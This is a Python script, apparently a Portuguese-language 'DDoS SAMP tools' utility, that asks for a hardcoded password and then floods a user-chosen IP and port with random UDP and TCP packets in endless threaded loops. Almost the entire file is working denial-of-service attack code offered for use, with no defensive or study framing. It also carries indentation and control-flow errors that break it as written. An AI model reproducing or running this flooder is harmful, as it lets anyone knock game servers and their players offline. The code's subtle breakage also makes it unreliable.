#AUTHOR SAMP NUDOS
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://t.me/LEOMODZOFC")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("CARREGANDO......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Digite seu nome de usuário: ')
    password = input('Digite sua senha: ')

      if username == 'NUDOS' and password == 'NUDOS':
        print('LOGADO COM SUCESSO BEM-VINDO LEO MODZ!!')
        break
    else:
        print('CREDENCIAIS INCORRETAS. VERIFIQUE SE VOCÊ TEM CAPS LOCK ATIVADO E TENTE NOVAMENTE.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[35m
	  DDOS SAMP TOOLS : LEO MODZ
	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
""")

ip = str(input(" IP :"))
port = int(input(" PORTA :"))
choice = str(input(" (y/n) :"))
times = int(input(" TEMPO :"))
threads = int(input(" TÓPICOS :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Ataque enviado!!!")
		except:
			print("[!] Erro!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque enviado!!!")
		except:
			s.close()
			print("[*] Erro!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque enviado!!!")
		except:
			s.close()
			print("[*] Erro!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque enviado!!!")
		except:
			s.close()
			print("[*] Erro!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
